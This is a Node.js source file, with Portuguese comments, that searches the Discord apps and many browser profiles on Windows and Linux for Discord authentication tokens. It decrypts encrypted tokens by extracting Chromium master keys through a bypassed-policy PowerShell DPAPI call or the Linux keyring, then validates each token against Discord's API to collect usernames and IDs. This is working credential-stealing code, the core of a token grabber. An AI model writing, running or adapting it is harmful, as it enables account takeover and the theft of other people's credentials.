// src/services/tokenFinder.js - Busca automática de tokens do Discord
//
// Compatível com Windows e Linux (Arch Linux, Ubuntu, Fedora, etc.)
//
// Procura tokens do Discord nos seguintes locais:
// 1. Discord Desktop (app instalado)
// 2. Discord PTB (Public Test Build)
// 3. Discord Canary
// 4. Discord via Flatpak / Snap (Linux)
// 5. Google Chrome / Chromium
// 6. Microsoft Edge
// 7. Brave Browser
// 8. Opera / Opera GX
// 9. Vivaldi
// 10. Firefox (perfis do Linux)
//
// Suporta dois formatos:
// - Tokens em texto puro (regex nos ficheiros .ldb/.log)
// - Tokens encriptados:
//   - Windows: DPAPI (CryptUnprotectData) + AES-256-GCM
//   - Linux: GNOME Keyring / secret-tool + AES-128-CBC (PBKDF2)

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');
const os = require('os');

// Padrão regex para tokens em texto puro
const PLAIN_TOKEN_PATTERNS = [
  /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/g,
  /mfa\.[\w-]{84,}/g,
];

// Padrão para tokens encriptados (Chromium DPAPI)
const ENCRYPTED_TOKEN_PATTERN = /dQw4w9WgXcQ:([^\s"',;}{)\]]+)/g;

const isLinux = process.platform === 'linux';
const isWindows = process.platform === 'win32';

/**
 * Retorna os caminhos onde o Discord/navegadores guardam dados.
 * Suporta Windows e Linux (incluindo Arch Linux e outras distros).
 */
function getSearchPaths() {
  if (isLinux) {
    return getLinuxSearchPaths();
  }
  return getWindowsSearchPaths();
}

/**
 * Descobre todos os perfis de um navegador Chromium (Default, Profile 1, Profile 2, etc.)
 * Retorna array de { profileName, leveldb, localState }.
 */
function discoverChromiumProfiles(browserName, userDataDir) {
  const results = [];
  const localState = path.join(userDataDir, 'Local State');

  if (!fs.existsSync(userDataDir)) return results;

  try {
    const entries = fs.readdirSync(userDataDir);
    for (const entry of entries) {
      // Perfis válidos: "Default", "Profile 1", "Profile 2", etc.
      if (entry !== 'Default' && !entry.startsWith('Profile ')) continue;
      const leveldb = path.join(userDataDir, entry, 'Local Storage', 'leveldb');
      if (fs.existsSync(leveldb)) {
        const label = entry === 'Default' ? browserName : `${browserName} (${entry})`;
        results.push({ name: label, leveldb, localState });
      }
    }
  } catch (_) {}

  // Se nenhum perfil encontrado, tenta o Default de qualquer forma
  if (results.length === 0) {
    results.push({
      name: browserName,
      leveldb: path.join(userDataDir, 'Default', 'Local Storage', 'leveldb'),
      localState,
    });
  }

  return results;
}

function getWindowsSearchPaths() {
  const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
  const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');

  return [
    // ===== Aplicações Discord =====
    {
      name: 'Discord',
      leveldb: path.join(appData, 'discord', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'discord', 'Local State'),
    },
    {
      name: 'Discord PTB',
      leveldb: path.join(appData, 'discordptb', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'discordptb', 'Local State'),
    },
    {
      name: 'Discord Canary',
      leveldb: path.join(appData, 'discordcanary', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'discordcanary', 'Local State'),
    },
    // ===== Navegadores (Chromium-based) - múltiplos perfis =====
    ...discoverChromiumProfiles('Google Chrome', path.join(localAppData, 'Google', 'Chrome', 'User Data')),
    ...discoverChromiumProfiles('Microsoft Edge', path.join(localAppData, 'Microsoft', 'Edge', 'User Data')),
    ...discoverChromiumProfiles('Brave', path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data')),
    ...discoverChromiumProfiles('Vivaldi', path.join(localAppData, 'Vivaldi', 'User Data')),
    // Opera não usa o padrão "User Data/Default"
    {
      name: 'Opera',
      leveldb: path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'Opera Software', 'Opera Stable', 'Local State'),
    },
    {
      name: 'Opera GX',
      leveldb: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local State'),
    },
  ];
}

function getLinuxSearchPaths() {
  const home = os.homedir();
  const configDir = process.env.XDG_CONFIG_HOME || path.join(home, '.config');

  return [
    // ===== Aplicações Discord (Linux) =====
    {
      name: 'Discord',
      leveldb: path.join(configDir, 'discord', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'discord', 'Local State'),
    },
    {
      name: 'Discord PTB',
      leveldb: path.join(configDir, 'discordptb', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'discordptb', 'Local State'),
    },
    {
      name: 'Discord Canary',
      leveldb: path.join(configDir, 'discordcanary', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'discordcanary', 'Local State'),
    },
    // ===== Discord via Flatpak =====
    {
      name: 'Discord (Flatpak)',
      leveldb: path.join(home, '.var', 'app', 'com.discordapp.Discord', 'config', 'discord', 'Local Storage', 'leveldb'),
      localState: path.join(home, '.var', 'app', 'com.discordapp.Discord', 'config', 'discord', 'Local State'),
    },
    // ===== Discord via Snap =====
    {
      name: 'Discord (Snap)',
      leveldb: path.join(home, 'snap', 'discord', 'current', '.config', 'discord', 'Local Storage', 'leveldb'),
      localState: path.join(home, 'snap', 'discord', 'current', '.config', 'discord', 'Local State'),
    },
    // ===== Navegadores (Chromium-based - Linux) - múltiplos perfis =====
    ...discoverChromiumProfiles('Google Chrome', path.join(configDir, 'google-chrome')),
    ...discoverChromiumProfiles('Google Chrome (Flatpak)', path.join(home, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome')),
    ...discoverChromiumProfiles('Chromium', path.join(configDir, 'chromium')),
    ...discoverChromiumProfiles('Microsoft Edge', path.join(configDir, 'microsoft-edge')),
    ...discoverChromiumProfiles('Brave', path.join(configDir, 'BraveSoftware', 'Brave-Browser')),
    ...discoverChromiumProfiles('Vivaldi', path.join(configDir, 'vivaldi')),
    // Opera não usa o padrão "User Data/Default" no Linux
    {
      name: 'Opera',
      leveldb: path.join(configDir, 'opera', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'opera', 'Local State'),
    },
    // ===== Firefox (Linux) - usa perfis e IndexedDB =====
    ...getFirefoxPaths(),
  ];
}

/**
 * Procura diretórios de perfil do Firefox.
 * Suporta Linux (~/.mozilla/firefox) e Windows (%APPDATA%/Mozilla/Firefox).
 *
 * Firefox armazena localStorage no ficheiro webappsstore.sqlite.
 * Se better-sqlite3 estiver instalado, lê diretamente do SQLite.
 * Caso contrário, faz fallback para scan de ficheiros por regex.
 */
function getFirefoxPaths() {
  const home = os.homedir();
  let firefoxDir;

  if (isWindows) {
    const appData = process.env.APPDATA || path.join(home, 'AppData', 'Roaming');
    firefoxDir = path.join(appData, 'Mozilla', 'Firefox', 'Profiles');
    // No Windows, os perfis estão em "Profiles" ou diretamente no diretório pai
    if (!fs.existsSync(firefoxDir)) {
      firefoxDir = path.join(appData, 'Mozilla', 'Firefox');
    }
  } else {
    firefoxDir = path.join(home, '.mozilla', 'firefox');
  }

  if (!fs.existsSync(firefoxDir)) return [];

  const results = [];
  try {
    const entries = fs.readdirSync(firefoxDir);
    for (const entry of entries) {
      if (!entry.includes('.')) continue;
      const profilePath = path.join(firefoxDir, entry);

      try {
        const stat = fs.statSync(profilePath);
        if (!stat.isDirectory()) continue;
      } catch (_) { continue; }

      // 1. Tentar ler via webappsstore.sqlite (mais fiável)
      const webappStore = path.join(profilePath, 'webappsstore.sqlite');
      if (fs.existsSync(webappStore)) {
        results.push({
          name: `Firefox (${entry})`,
          leveldb: null, // Será tratado pelo scan de SQLite
          localState: null,
          firefoxSqlite: webappStore,
        });
        continue;
      }

      // 2. Fallback: scan do storage/default do Firefox
      const storagePath = path.join(profilePath, 'storage', 'default');
      if (fs.existsSync(storagePath)) {
        try {
          const storageDirs = fs.readdirSync(storagePath);
          for (const dir of storageDirs) {
            if (dir.includes('discord.com')) {
              const lsDir = path.join(storagePath, dir, 'ls');
              if (fs.existsSync(lsDir)) {
                results.push({
                  name: `Firefox (${entry})`,
                  leveldb: lsDir,
                  localState: null,
                });
              }
            }
          }
        } catch (_) {}
      }
    }
  } catch (_) {}

  return results;
}

/**
 * Lê tokens do Firefox diretamente do ficheiro webappsstore.sqlite via better-sqlite3.
 * Procura entradas com scope de discord.com no localStorage do Firefox.
 */
function findTokensInFirefoxSqlite(sqlitePath) {
  const tokens = new Set();

  let Database;
  try {
    Database = require('better-sqlite3');
  } catch (_) {
    // better-sqlite3 não está instalado, retorna vazio
    return tokens;
  }

  try {
    // Abrir em modo read-only para não interferir com o Firefox
    const db = new Database(sqlitePath, { readonly: true, fileMustExist: true });

    try {
      // webappsstore.sqlite tem a tabela "webappsstore2"
      // colunas: originAttributes, originKey, scope, key, value
      // O scope do Discord é algo como "moc.drocsid.:https:443"
      const rows = db.prepare(
        "SELECT key, value FROM webappsstore2 WHERE scope LIKE '%drocsid%' OR originKey LIKE '%discord.com%'"
      ).all();

      for (const row of rows) {
        const content = `${row.key || ''} ${row.value || ''}`;
        for (const pattern of PLAIN_TOKEN_PATTERNS) {
          pattern.lastIndex = 0;
          let match;
          while ((match = pattern.exec(content)) !== null) {
            tokens.add(match[0]);
          }
        }
      }
    } finally {
      db.close();
    }
  } catch (_) {
    // Ficheiro bloqueado pelo Firefox ou corrompido - normal
  }

  return tokens;
}

// ====================== DECRYPTION (Windows DPAPI + Linux Keyring) ======================

/**
 * Lê a chave mestre de encriptação do ficheiro "Local State" do Chromium.
 * Windows: chave encriptada com DPAPI.
 * Linux: chave derivada da password do keyring (GNOME Keyring / KWallet / secret-tool).
 */
function getMasterKey(localStatePath) {
  if (!localStatePath || !fs.existsSync(localStatePath)) return null;

  try {
    const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    const encryptedKeyB64 = localState?.os_crypt?.encrypted_key;

    if (!encryptedKeyB64) {
      // No Linux, se não há encrypted_key, tentar obter via keyring
      if (isLinux) return getLinuxMasterKey();
      return null;
    }

    // Base64 decode -> remove prefixo "DPAPI" (5 bytes)
    const encryptedKey = Buffer.from(encryptedKeyB64, 'base64');
    const dpapiBlob = encryptedKey.slice(5);

    if (isWindows) {
      return dpapiDecrypt(dpapiBlob);
    }

    if (isLinux) {
      return getLinuxMasterKey();
    }

    return null;
  } catch (_) {
    return null;
  }
}

/**
 * Obtém a chave mestre do Chromium no Linux.
 *
 * No Linux, o Chromium usa uma password do keyring do sistema para derivar
 * a chave de encriptação via PBKDF2. A password padrão é "peanuts" quando
 * o keyring não está disponível, ou obtida via secret-tool do GNOME Keyring.
 */
function getLinuxMasterKey() {
  // Tentar obter a password do GNOME Keyring via secret-tool
  const passwords = [
    getSecretToolPassword('chromium', 'Chrome Safe Storage'),
    getSecretToolPassword('chrome', 'Chrome Safe Storage'),
    'peanuts', // Password padrão quando keyring não está disponível
  ];

  for (const password of passwords) {
    if (!password) continue;
    try {
      // Chromium no Linux usa PBKDF2 com a password do keyring
      // Salt: "saltysalt", iterações: 1, keylen: 16 bytes, hash: sha1
      const key = crypto.pbkdf2Sync(password, 'saltysalt', 1, 16, 'sha1');
      return key;
    } catch (_) {}
  }

  return null;
}

/**
 * Tenta obter a password de encriptação do Chromium via secret-tool (libsecret).
 * Funciona com GNOME Keyring, KDE KWallet (via libsecret bridge), etc.
 */
function getSecretToolPassword(application, label) {
  try {
    const result = execSync(
      `secret-tool lookup application ${application} 2>/dev/null || secret-tool lookup xdg:schema chrome_libsecret_os_crypt_password_v2 application ${application} 2>/dev/null`,
      { encoding: 'utf8', timeout: 5000 }
    ).trim();
    return result || null;
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta dados usando Windows DPAPI via PowerShell.
 * Usa CryptUnprotectData do Windows para desencriptar a chave mestre.
 */
function dpapiDecrypt(encryptedBuffer) {
  try {
    // Converte o buffer para base64 para passar ao PowerShell
    const b64 = encryptedBuffer.toString('base64');

    // Usa ficheiro temporário para evitar problemas com aspas no PowerShell
    const tmpScript = path.join(os.tmpdir(), `dpapi_${Date.now()}.ps1`);
    const psContent = [
      'Add-Type -AssemblyName "System.Security"',
      `$encrypted = [Convert]::FromBase64String("${b64}")`,
      '$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)',
      'Write-Output ([Convert]::ToBase64String($decrypted))',
    ].join('\r\n');

    fs.writeFileSync(tmpScript, psContent);

    const result = execSync(
      `powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "${tmpScript}"`,
      { encoding: 'utf8', timeout: 10000, windowsHide: true }
    ).trim();

    // Limpar ficheiro temporário
    try { fs.unlinkSync(tmpScript); } catch (_) {}

    return Buffer.from(result, 'base64');
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta um token encriptado usando a chave mestre.
 *
 * Windows (AES-256-GCM):
 *   [v10/v11 (3 bytes)] [IV (12 bytes)] [ciphertext + tag (16 bytes)]
 *
 * Linux (AES-128-CBC):
 *   [v10/v11 (3 bytes)] [IV (16 bytes)] [ciphertext com padding PKCS7]
 */
function decryptToken(encryptedTokenB64, masterKey) {
  try {
    const buf = Buffer.from(encryptedTokenB64, 'base64');

    // Os primeiros 3 bytes são a versão (v10 ou v11)
    const version = buf.slice(0, 3).toString();
    if (version !== 'v10' && version !== 'v11') return null;

    if (isLinux) {
      return decryptTokenLinux(buf, masterKey);
    }

    return decryptTokenWindows(buf, masterKey);
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta token no Windows com AES-256-GCM.
 */
function decryptTokenWindows(buf, masterKey) {
  try {
    const iv = buf.slice(3, 15);
    const ciphertextWithTag = buf.slice(15);
    const authTag = ciphertextWithTag.slice(ciphertextWithTag.length - 16);
    const ciphertext = ciphertextWithTag.slice(0, ciphertextWithTag.length - 16);

    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
    decipher.setAuthTag(authTag);

    let decrypted = decipher.update(ciphertext, null, 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta token no Linux com AES-128-CBC (formato Chromium Linux).
 */
function decryptTokenLinux(buf, masterKey) {
  try {
    // No Linux, IV é de 16 bytes (espaço com valor 0x20 repetido)
    const iv = Buffer.alloc(16, ' ');
    const ciphertext = buf.slice(3);

    const decipher = crypto.createDecipheriv('aes-128-cbc', masterKey, iv);
    let decrypted = decipher.update(ciphertext, null, 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (_) {
    return null;
  }
}

// ====================== TOKEN SEARCH ======================

/**
 * Procura tokens (em texto puro e encriptados) num diretório de LevelDB.
 */
function findTokensInDirectory(dirPath, masterKey) {
  const tokens = new Set();

  if (!fs.existsSync(dirPath)) return tokens;

  try {
    const files = fs.readdirSync(dirPath);

    for (const file of files) {
      // Aceitar .ldb, .log e ficheiros do Firefox (.sqlite, data sem extensão)
      const validExt = file.endsWith('.ldb') || file.endsWith('.log') || file.endsWith('.sqlite');
      if (!validExt && file.includes('.')) continue;

      const filePath = path.join(dirPath, file);

      try {
        // Ler como binary para não perder dados
        const contentBuf = fs.readFileSync(filePath);
        const content = contentBuf.toString('utf8');

        // 1. Procurar tokens em texto puro
        for (const pattern of PLAIN_TOKEN_PATTERNS) {
          pattern.lastIndex = 0;
          let match;
          while ((match = pattern.exec(content)) !== null) {
            tokens.add(match[0]);
          }
        }

        // 2. Procurar tokens encriptados (se temos a masterKey)
        if (masterKey) {
          ENCRYPTED_TOKEN_PATTERN.lastIndex = 0;
          let match;
          while ((match = ENCRYPTED_TOKEN_PATTERN.exec(content)) !== null) {
            const encryptedB64 = match[1];
            try {
              const decrypted = decryptToken(encryptedB64, masterKey);
              if (decrypted && decrypted.length > 20) {
                tokens.add(decrypted);
              }
            } catch (_) {}
          }
        }
      } catch (_) {
        // Ficheiro bloqueado pelo processo - normal se o app estiver aberto
      }
    }
  } catch (_) {}

  return tokens;
}

/**
 * Procura tokens em todos os locais conhecidos.
 * Retorna um array de { source: string, token: string }.
 */
function findAllTokens() {
  const results = [];
  const seenTokens = new Set();
  const searchPaths = getSearchPaths();

  for (const location of searchPaths) {
    let foundTokens;

    if (location.firefoxSqlite) {
      // Firefox com SQLite - usar leitura direta do webappsstore.sqlite
      foundTokens = findTokensInFirefoxSqlite(location.firefoxSqlite);
    } else if (location.leveldb) {
      // Chromium/Discord - usar scan de LevelDB
      let masterKey = null;
      if (location.localState) {
        masterKey = getMasterKey(location.localState);
      }
      foundTokens = findTokensInDirectory(location.leveldb, masterKey);
    } else {
      continue;
    }

    for (const token of foundTokens) {
      if (seenTokens.has(token)) continue;
      seenTokens.add(token);

      results.push({
        source: location.name,
        token,
        preview: maskToken(token),
      });
    }
  }

  return results;
}

/**
 * Mascara um token para exibição segura.
 */
function maskToken(token) {
  if (token.length <= 10) return '***';
  const start = token.substring(0, 6);
  const end = token.substring(token.length - 4);
  return `${start}${'*'.repeat(8)}${end}`;
}

/**
 * Valida se um token é funcional tentando consultar a API do Discord.
 * Retorna { valid: boolean, username?: string }
 */
async function validateToken(token) {
  const https = require('https');

  return new Promise((resolve) => {
    const options = {
      hostname: 'discord.com',
      path: '/api/v9/users/@me',
      method: 'GET',
      headers: {
        'Authorization': token,
        'Content-Type': 'application/json',
      },
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          try {
            const user = JSON.parse(data);
            resolve({
              valid: true,
              username: user.username || 'Desconhecido',
              globalName: user.global_name || user.username,
              id: user.id,
            });
          } catch (_) {
            resolve({ valid: false });
          }
        } else {
          resolve({ valid: false });
        }
      });
    });

    req.on('error', () => resolve({ valid: false }));
    req.setTimeout(5000, () => {
      req.destroy();
      resolve({ valid: false });
    });
    req.end();
  });
}

/**
 * Busca e valida todos os tokens encontrados.
 * Retorna apenas os tokens válidos com informações do utilizador.
 */
async function findAndValidateTokens(onProgress) {
  const allTokens = findAllTokens();

  if (allTokens.length === 0) {
    return [];
  }

  const validTokens = [];
  // Deduplica por token real (o mesmo token pode estar em vários locais)
  const validatedSet = new Set();

  for (let i = 0; i < allTokens.length; i++) {
    const entry = allTokens[i];

    if (onProgress) {
      onProgress({
        current: i + 1,
        total: allTokens.length,
        source: entry.source,
        preview: entry.preview,
      });
    }

    if (validatedSet.has(entry.token)) continue;
    validatedSet.add(entry.token);

    const result = await validateToken(entry.token);

    if (result.valid) {
      validTokens.push({
        source: entry.source,
        token: entry.token,
        preview: entry.preview,
        username: result.username,
        globalName: result.globalName,
        userId: result.id,
      });
    }
  }

  return validTokens;
}

module.exports = {
  findAllTokens,
  validateToken,
  findAndValidateTokens,
  maskToken,
};
